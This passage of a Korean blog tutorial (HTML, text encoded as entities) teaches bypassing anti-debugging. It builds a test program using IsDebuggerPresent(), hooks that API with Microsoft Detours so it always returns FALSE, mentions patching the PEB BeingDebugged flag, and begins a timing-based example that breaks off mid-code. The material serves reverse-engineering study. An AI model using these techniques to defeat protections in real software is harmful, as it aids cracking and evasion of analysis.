&#xD569;&#xB2C8;&#xB2E4;. &#xC6B0;&#xD68C; &#xBC29;&#xBC95;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:</p><ol><li><strong>&#xD0C0;&#xC774;&#xBC0D; &#xAE30;&#xBC18; &#xC6B0;&#xD68C;</strong>: &#xD0C0;&#xC774;&#xBC0D; &#xAE30;&#xBC18; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xC2E4;&#xD589; &#xC18D;&#xB3C4;&#xB97C; &#xCE21;&#xC815;&#xD558;&#xC5EC; &#xB514;&#xBC84;&#xAC70;&#xC758; &#xC874;&#xC7AC;&#xB97C; &#xD0D0;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xAE30; &#xC704;&#xD574;, IDA&#xC640; &#xAC19;&#xC740; &#xB514;&#xBC84;&#xAE45; &#xD234;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xC5EC; &#xCF54;&#xB4DC;&#xB97C; &#xD328;&#xCE58;&#xD558;&#xC5EC; &#xD0C0;&#xC774;&#xBC0D; &#xCE21;&#xC815; &#xCF54;&#xB4DC;&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><strong>&#xC608;&#xC678; &#xCC98;&#xB9AC; &#xC870;&#xC791;</strong>: Dynamic &#xAE30;&#xBC95;&#xC740; &#xC608;&#xC678; &#xBC1C;&#xC0DD; &#xC2DC; &#xB514;&#xBC84;&#xAC70;&#xC758; &#xC874;&#xC7AC;&#xB97C; &#xD0D0;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xAE30; &#xC704;&#xD574;, &#xC608;&#xC678; &#xCC98;&#xB9AC; &#xB8E8;&#xD2F4;&#xC744; &#xC870;&#xC791;&#xD558;&#xC5EC; &#xB514;&#xBC84;&#xAC70;&#xC758; &#xC874;&#xC7AC;&#xB97C; &#xC228;&#xAE38; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><h1 id="&#xC2E4;&#xC2B5;"><a href="#&#xC2E4;&#xC2B5;" class="headerlink" title="&#xC2E4;&#xC2B5;"></a>&#xC2E4;&#xC2B5;</h1><p>&#xC790;! &#xADF8;&#xB7EC;&#xBA74; &#xC774;&#xC81C; &#xC2E4;&#xC2B5;&#xC744; &#xC9C4;&#xD589;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>&#xC2E4;&#xC2B5; &#xD658;&#xACBD;</strong></p><ul><li>&#xC6B4;&#xC601;&#xCCB4;&#xC81C;: Windows 11</li><li>&#xBC14;&#xC774;&#xB108;&#xB9AC; &#xC544;&#xD0A4;&#xD14D;&#xCC98;: 32&#xBE44;&#xD2B8;</li><li>&#xB514;&#xBC84;&#xAE45; &#xB3C4;&#xAD6C;: IDA Freeware 8.4</li><li>IDE: Visual Studio 2022</li></ul><p>&#xC774; &#xD658;&#xACBD;&#xC5D0;&#xC11C; 32&#xBE44;&#xD2B8; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xBE4C;&#xB4DC;&#xD558;&#xACE0; IDA Freeware&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC774; &#xC801;&#xC6A9;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xB300;&#xD574; &#xB514;&#xBC84;&#xAE45;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC744; &#xC2E4;&#xC2B5;&#xD560; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><h2 id="Static-&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;-&#xAE30;&#xBC95;-&#xC6B0;&#xD68C;-&#xC2E4;&#xC2B5;"><a href="#Static-&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;-&#xAE30;&#xBC95;-&#xC6B0;&#xD68C;-&#xC2E4;&#xC2B5;" class="headerlink" title="Static &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95; &#xC6B0;&#xD68C; &#xC2E4;&#xC2B5;"></a>Static &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95; &#xC6B0;&#xD68C; &#xC2E4;&#xC2B5;</h2><h3 id="1-&#xC77C;&#xBC18;-&#xD504;&#xB85C;&#xADF8;&#xB7A8;"><a href="#1-&#xC77C;&#xBC18;-&#xD504;&#xB85C;&#xADF8;&#xB7A8;" class="headerlink" title="1. &#xC77C;&#xBC18; &#xD504;&#xB85C;&#xADF8;&#xB7A8;"></a>1. &#xC77C;&#xBC18; &#xD504;&#xB85C;&#xADF8;&#xB7A8;</h3><p>&#x201C;Part 1&#x201D;&#xC5D0;&#xC11C;&#xB3C4; &#xBD24;&#xB4EF;&#xC774; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC774; &#xC801;&#xC6A9;&#xB41C; &#xC77C;&#xBC18; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Visual Studio 2022&#xC5D0;&#xC11C; &#xBE48; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC8FC;&#xC2DC;&#xACE0; main.cpp&#xB97C; &#xB9CC;&#xB4E0; &#xD6C4; x86&#xC73C;&#xB85C; &#xBE4C;&#xB4DC;&#xD574;&#xC8FC;&#xC138;&#xC694;.</p><p><img src="image.png" alt="image.png"></p><pre><code class="hljs c"><span class="hljs-comment">// main.cpp</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>{    <span class="hljs-keyword">if</span> (IsDebuggerPresent()) {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Debugger detected!\n&quot;</span>);    }    <span class="hljs-keyword">else</span> {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No debugger found.\n&quot;</span>);    }    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xBE4C;&#xB4DC; &#xD6C4; exe&#xAC00; &#xC0DD;&#xC131;&#xB41C; &#xD3F4;&#xB354;(./Debug)&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xC11C; &#xBE4C;&#xB4DC;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; <code>No debugger found.</code> &#xAC00; &#xB739;&#xB2C8;&#xB2E4;.</p><p><img src="image%201.png" alt="image.png"></p><p>&#xC774;&#xC81C; IDA Freeware&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xB514;&#xBC84;&#xAE45;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. IDA&#xC5D0; &#xBD88;&#xB7EC;&#xC640; F9&#xB97C; &#xB20C;&#xB7EC; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC2DC;&#xB3C4;&#xD558;&#xBA74;..!!</p><p><img src="image%202.png" alt="image.png"></p><p>&#xC704;&#xC640; &#xAC19;&#xC774; <code>IsDebuggerPresent()</code> &#xD568;&#xC218;&#xC5D0; &#xC758;&#xD574; &#xB514;&#xBC84;&#xAC70;&#xAC00; &#xAC10;&#xC9C0;&#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xBB38;&#xC7A5;&#xC774; &#xB098;&#xC635;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB294; <code>IsDebuggerPresent()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xD0D0;&#xC9C0;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xB9CC;&#xC57D; &#xC774; &#xD568;&#xC218;&#xAC00; &#xC81C; &#xAE30;&#xB2A5;&#xC744; &#xBABB;&#xD55C;&#xB2E4;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C; &#xB420;&#xAE4C;&#xC694;?! &#xC774;&#xC81C; &#x201C;API Hooking&#x201D;&#xC744; &#xD1B5;&#xD574; Static &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xC2E4;&#xC2B5;&#xC744; &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="2-API-Hooking-&#xC2E4;&#xC2B5;-Bypass-Static-Anti-Debugging"><a href="#2-API-Hooking-&#xC2E4;&#xC2B5;-Bypass-Static-Anti-Debugging" class="headerlink" title="2. API Hooking &#xC2E4;&#xC2B5; (Bypass Static Anti-Debugging)"></a><strong>2. API Hooking &#xC2E4;&#xC2B5; (Bypass Static Anti-Debugging)</strong></h3><p>API Hooking &#xC2E4;&#xC2B5;&#xC740; Microsoft Detours &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xD1B5;&#xD574; &#xC9C4;&#xD589;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB294; Windows&#xC5D0;&#xC11C; API &#xD568;&#xC218;&#xB97C; Hooking&#xD558;&#xC5EC; &#xB514;&#xBC84;&#xAC70;&#xC758; &#xC874;&#xC7AC;&#xB97C; &#xC228;&#xAE38; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xB3C4;&#xC640;&#xC90D;&#xB2C8;&#xB2E4;. </p><p>&#xBA3C;&#xC800; Detours &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xC124;&#xCE58;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><ol><li><p><a href="https://github.com/microsoft/detours">https://github.com/microsoft/detours</a> &#xC5D0;&#xC11C; &#xC555;&#xCD95;&#xD30C;&#xC77C;&#xC744; &#xB2E4;&#xC6B4;&#xBC1B;&#xC740; &#xD6C4;&#xC5D0; &#xC6D0;&#xD558;&#xB294; &#xD3F4;&#xB354;&#xC5D0; &#xB123;&#xC740; &#xD6C4; &#xD574;&#xC81C;&#xD574; &#xC8FC;&#xC138;&#xC694;.</p><p> <img src="image%203.png" alt="image.png"></p></li><li><p>Visual Studio 2022&#xC5D0;&#xC11C; &#xD130;&#xBBF8;&#xB110;&#xC744; &#xCF2D;&#xB2C8;&#xB2E4;.</p><p> <img src="image%204.png" alt="image.png"></p></li><li><p><code>nmake</code> &#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xB97C; &#xBE4C;&#xB4DC;&#xD558;&#xBA74; bin, include, lib &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xAC00; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</p><p> <img src="image%205.png" alt="image.png"></p><p> <img src="image%206.png" alt="image.png"></p></li></ol><ol><li><p>Visual Studio&#xC5D0;&#xC11C; <code>&#xD504;&#xB85C;&#xC81D;&#xD2B8;&gt;&#xC18D;&#xC131;</code> &#xC73C;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00; &#xAD6C;&#xC131;&#xC740; &#x201C;&#xBAA8;&#xB4E0; &#xAD6C;&#xC131;&#x201D;, &#xD50C;&#xB7AB;&#xD3FC;&#xC740; &#x201C;Win32&#x201D;&#xB85C; &#xBCC0;&#xACBD;&#xD569;&#xB2C8;&#xB2E4;.</p><p> <img src="image%207.png" alt="image.png"></p></li><li><p>Detours &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; Visual Studio&#xC5D0; &#xCD94;&#xAC00;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><ul><li><p><strong>C/C++ &#xC18D;&#xC131;&#xC5D0;&#xC11C; &#xCD94;&#xAC00; &#xD3EC;&#xD568; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC124;&#xC815;</strong></p><ol><li>&#xD504;&#xB85C;&#xC81D;&#xD2B8; &#xC18D;&#xC131; &#xCC3D;&#xC5D0;&#xC11C; &#x201C;C/C++&#x201D; &#xD0ED;&#xC744; &#xC120;&#xD0DD;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#x201C;&#xC77C;&#xBC18;&#x201D; &#xD558;&#xC704; &#xBA54;&#xB274;&#xC5D0;&#xC11C; &#x201C;&#xCD94;&#xAC00; &#xD3EC;&#xD568; &#xB514;&#xB809;&#xD130;&#xB9AC;&#x201D; &#xD56D;&#xBAA9;&#xC744; &#xCC3E;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><p>&#x201C;&#xCD94;&#xAC00; &#xD3EC;&#xD568; &#xB514;&#xB809;&#xD130;&#xB9AC;&#x201D; &#xD544;&#xB4DC;&#xC5D0;&#xC11C; Detours&#xC758; include &#xACBD;&#xB85C;&#xB97C; &#xC785;&#xB825;&#xD569;&#xB2C8;&#xB2E4;:</p><p> <code>C:\Users\OUYA77\Desktop\Detours-main\include</code></p></li><li><p>&#x201C;&#xD655;&#xC778;&#x201D; &#xBC84;&#xD2BC;&#xC744; &#xD074;&#xB9AD;&#xD558;&#xC5EC; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xC744; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ol></li><li><p><strong>&#xB9C1;&#xCEE4; &#xC18D;&#xC131;&#xC5D0;&#xC11C; &#xCD94;&#xAC00; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC124;&#xC815;</strong></p><ol><li>&#xD504;&#xB85C;&#xC81D;&#xD2B8; &#xC18D;&#xC131; &#xCC3D;&#xC5D0;&#xC11C; &#x201C;&#xB9C1;&#xCEE4;&#x201D; &#xD0ED;&#xC744; &#xC120;&#xD0DD;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#x201C;&#xC77C;&#xBC18;&#x201D; &#xD558;&#xC704; &#xBA54;&#xB274;&#xC5D0;&#xC11C; &#x201C;&#xCD94;&#xAC00; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xB514;&#xB809;&#xD130;&#xB9AC;&#x201D; &#xD56D;&#xBAA9;&#xC744; &#xCC3E;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><p>&#x201C;&#xCD94;&#xAC00; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xB514;&#xB809;&#xD130;&#xB9AC;&#x201D; &#xD544;&#xB4DC;&#xC5D0;&#xC11C; Detours&#xC758; lib &#xACBD;&#xB85C;&#xB97C; &#xC785;&#xB825;&#xD569;&#xB2C8;&#xB2E4;:</p><p> <code>C:\Users\OUYA77\Desktop\Detours-main\lib</code></p></li><li><p>&#x201C;&#xD655;&#xC778;&#x201D; &#xBC84;&#xD2BC;&#xC744; &#xD074;&#xB9AD;&#xD558;&#xC5EC; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xC744; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ol></li></ul></li></ol><p>&#xB124; &#xC774;&#xC81C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC900;&#xBE44;&#xAC00; &#xB418;&#xC5C8;&#xC73C;&#xBA74; dllmain.cpp&#xB97C; &#xC120;&#xC5B8;&#xD574;&#xC8FC;&#xC138;&#xC694;.</p><pre><code class="hljs c"><span class="hljs-comment">// dllmain.cpp</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;detours.lib&quot;</span>)</span></code></pre><p>&#xC774;&#xC81C; &#xC9C4;&#xC9DC;&#xB85C; Detours&#xB97C; &#xC0AC;&#xC6A9;&#xD574; <strong><code>IsDebuggerPresent()</code></strong> &#xD568;&#xC218;&#xB97C; Hooking&#xD558;&#xC5EC; Static Anti-Debugging &#xC744; &#xC6B0;&#xD68C;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">// main.cpp</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;detours.h&gt;</span></span><span class="hljs-comment">// IsDebuggerPresent() &#xD568;&#xC218;&#xB97C; Hooking&#xD558;&#xAE30; &#xC704;&#xD55C; &#xD568;&#xC218;</span><span class="hljs-function">BOOL WINAPI <span class="hljs-title">HookedIsDebuggerPresent</span><span class="hljs-params">()</span> </span>{    <span class="hljs-keyword">return</span> FALSE; <span class="hljs-comment">// &#xD56D;&#xC0C1; &#xB514;&#xBC84;&#xAC70;&#xAC00; &#xC5C6;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC751;&#xB2F5;</span>}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>{    <span class="hljs-comment">// IsDebuggerPresent() &#xD568;&#xC218;&#xB97C; Hooking</span>    HMODULE hKernel32 = GetModuleHandleA(<span class="hljs-string">&quot;kernel32.dll&quot;</span>);    <span class="hljs-keyword">if</span> (hKernel32) {        FARPROC pIsDebuggerPresent = GetProcAddress(hKernel32, <span class="hljs-string">&quot;IsDebuggerPresent&quot;</span>);        <span class="hljs-keyword">if</span> (pIsDebuggerPresent) {            <span class="hljs-comment">// Detours &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; Hooking</span>            DetourTransactionBegin();            DetourUpdateThread(GetCurrentThread());            DetourAttach(&amp;(PVOID&amp;)pIsDebuggerPresent, HookedIsDebuggerPresent);            DetourTransactionCommit();        }    }    <span class="hljs-comment">// &#xD14C;&#xC2A4;&#xD2B8;</span>    <span class="hljs-keyword">if</span> (IsDebuggerPresent()) {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Debugger detected!\n&quot;</span>);    }    <span class="hljs-keyword">else</span> {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No debugger found.\n&quot;</span>);    }    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xC704; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xB97C; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xBE4C;&#xB4DC; &#xD6C4; &#xC804;&#xACFC; &#xAC19;&#xC774; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xC9C4;&#xD589;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image%208.png" alt="image.png"></p><p>&#xB2F9;&#xC5F0;&#xD788; &#xB514;&#xBC84;&#xAC70;&#xB97C; &#xBD99;&#xC774;&#xC9C0; &#xC54A;&#xC740; &#xB85C;&#xCEEC;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD558;&#xBA74; <code>No debugger found.</code> &#xAC00; &#xCD9C;&#xB825;&#xB418;&#xC5B4;&#xC694;. &#xADF8;&#xB7FC; &#xC774;&#xC81C; IDA&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xB514;&#xBC84;&#xAC70;&#xB97C; &#xBD99;&#xC774;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C; &#xB420;&#xAE4C;&#xC694;!!</p><p><img src="image%209.png" alt="image.png"></p><p>&#xC624;&#xC6B0;&#xC57C;&#x2026; IDA&#xB97C; &#xD1B5;&#xD574; &#xB514;&#xBC84;&#xAE45; &#xC911;&#xC784;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0; &#xB514;&#xBC84;&#xAC70;&#xB97C; &#xBABB;&#xCC3E;&#xC558;&#xB2E4;&#xACE0; &#xC2E4;&#xD589;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="1b18ed6b-05c4-4b20-a412-522bd1c12bb3.png" alt="image.png"></p><p>&#xC774;&#xB807;&#xAC8C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; API &#xD6C4;&#xD0B9;&#xC744; &#xD1B5;&#xD574; Static &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC744; &#xBB34;&#xB825;&#xD654;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Static &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xC2DC;&#xC2A4;&#xD15C; &#xC815;&#xBCF4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xAD6C;&#xD604;&#xB41C; &#xAE30;&#xBC95;&#xC774;&#xAE30;&#xC5D0; </p><ul><li><code>NtQueryInformationProcess()</code> &#xC640; &#xAC19;&#xC774; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <strong>&#xD568;&#xC218;&#xB97C; &#xD6C4;&#xD0B9;</strong>&#xD558;&#xAC70;&#xB098;</li><li>PEB&#xC758; <code>BeingDebugged</code> &#xD50C;&#xB798;&#xADF8; &#xB4F1; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xACFC; &#xAD00;&#xB828;&#xB418;&#xB294; &#xC815;&#xBCF4;&#xB97C; <strong>&#xBA54;&#xBAA8;&#xB9AC; &#xC0C1;&#xC5D0;&#xC11C; &#xC9C1;&#xC811;&#xC801;&#xC73C;&#xB85C;</strong> <strong>&#xC218;&#xC815;</strong>&#xD574;&#xC11C; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<ul><li>&#xC774; &#xCE5C;&#xAD6C;&#xB4E4;&#xC740; &#xBCF4;&#xD1B5; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xD568;&#xC218;&#xB4E4;&#xC744; &#xD1B5;&#xD574; &#xAC12;&#xC774; &#xBCC0;&#xC870;&#xB429;&#xB2C8;&#xB2E4;.</li></ul></li></ul><p>&#xADF8;&#xB7EC;&#xBA74; &#xB514;&#xBC84;&#xAC70;&#xC758; &#xC6D0;&#xB9AC;&#xB97C; &#xC5ED;&#xC774;&#xC6A9;&#xD558;&#xB294; <strong>Dynamic &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;</strong>&#xC740; &#xC5B4;&#xB5BB;&#xAC8C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC744;&#xAE4C;&#xC694;? Static &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC740; &#xD55C; &#xBC88; &#xD574;&#xC81C;&#xD558;&#xBA74; &#xC774;&#xD6C4; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xB514;&#xBC84;&#xAE45;&#xC5D0; &#xBB38;&#xC81C;&#xAC00; &#xC5C6;&#xC9C0;&#xB9CC;, Dynamic &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC740; &#xC2E4;&#xD589; &#xC911; &#xC9C0;&#xC18D;&#xC801;&#xC73C;&#xB85C; &#xC801;&#xC6A9;&#xB418;&#xBBC0;&#xB85C; &#xB9E4;&#xBC88; &#xC6B0;&#xD68C;&#xD574;&#xC57C; &#xD558;&#xAC70;&#xB098;, &#xBCF4;&#xB2E4; &#xADFC;&#xBCF8;&#xC801;&#xC778; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xB300;&#xC751;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>Dynamic &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xBA70; &#xCC28;&#xC774;&#xB97C; &#xB290;&#xAEF4;&#xBCF4;&#xC2DC;&#xC8E0;! </p><h2 id="Dynamic-&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;-&#xAE30;&#xBC95;-&#xC6B0;&#xD68C;-&#xC2E4;&#xC2B5;"><a href="#Dynamic-&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;-&#xAE30;&#xBC95;-&#xC6B0;&#xD68C;-&#xC2E4;&#xC2B5;" class="headerlink" title="Dynamic &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95; &#xC6B0;&#xD68C; &#xC2E4;&#xC2B5;"></a>Dynamic &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95; &#xC6B0;&#xD68C; &#xC2E4;&#xC2B5;</h2><h3 id="1-&#xC77C;&#xBC18;-&#xD504;&#xB85C;&#xADF8;&#xB7A8;-1"><a href="#1-&#xC77C;&#xBC18;-&#xD504;&#xB85C;&#xADF8;&#xB7A8;-1" class="headerlink" title="1. &#xC77C;&#xBC18; &#xD504;&#xB85C;&#xADF8;&#xB7A8;"></a>1. &#xC77C;&#xBC18; &#xD504;&#xB85C;&#xADF8;&#xB7A8;</h3><p>Dynamic &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xC2E4;&#xC2B5;&#xB3C4; &#x201C;Part 1&#x201D;&#xC5D0;&#xC11C; &#xC54C;&#xC544;&#xBD24;&#xB358; Timing &#xAE30;&#xBC18; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95;&#xC73C;&#xB85C; &#xC9C4;&#xD589;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xC758; &#xCF54;&#xB4DC;&#xB97C; x86&#xC73C;&#xB85C; &#xBE4C;&#xB4DC;&#xD574;&#xC8FC;&#xC138;&#xC694;.</p><pre><code class="hljs c"><span class="hljs-comment">// main.cpp</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt; </span></span><span class="hljs-comment">// &#xD0A4; &#xBCF5;&#xD638;&#xD654; &#xD568;&#xC218;</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">decryptKey</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* key)</span> </span>{    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(key); i++) {        key[i] = key[i]<span class="hljs-number">-1</span>; <span class="hljs-comment">// &#xAC04;&#xB2E8;&#xD55C; Ceaser &#xC554;&#xD638;&#xD654;</span>    }}<span class="hljs-comment">// &#xC911;&#xC694;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xD568;&#xC218;</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">processImportantData</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* key)</span> </span>{    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Processing important data with key: %s\n&quot;</span>, key);    <span class="hljs-comment">// 